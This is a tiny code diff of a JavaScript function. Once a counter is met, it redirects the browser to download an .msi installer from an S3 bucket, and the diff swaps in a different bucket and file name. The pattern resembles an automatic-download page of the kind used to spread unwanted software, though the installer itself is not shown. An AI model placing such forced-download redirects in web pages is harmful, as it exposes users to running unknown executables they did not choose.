@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://tswa.s3.ap-southeast-2.amazonaws.com/TSEAN.msi";
+		var url="https://taems1.s3.us-east-1.amazonaws.com/Taems.msi";
 		window.location=url;
 	}
 }
